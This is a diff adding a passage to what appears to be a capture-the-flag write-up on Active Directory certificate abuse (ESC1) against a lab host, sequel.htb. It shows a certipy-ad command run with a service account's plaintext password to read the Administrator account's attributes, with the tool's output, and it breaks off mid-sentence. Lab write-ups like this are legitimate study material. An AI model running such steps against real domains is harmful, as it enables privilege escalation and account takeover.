@@ -596,5 +596,18 @@ This made the template vulnerable to ESC1
 ## ESC1
 
 ```python
+certipy-ad account -u 'ca_svc@sequel.htb' -p 'Password123!' -dc-ip '10.129.232.128' -user 'administrator' read
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Reading attributes for 'Administrator':
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
+    name                                : Administrator
+    objectSid                           : S-1-5-21-548670397-972687484-3496335370-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2024-06-08T16:39:50+00:00
+    whenChanged                         : 2026-07-23T18:14:00+00:00
 ```
+
+First i need the administrato
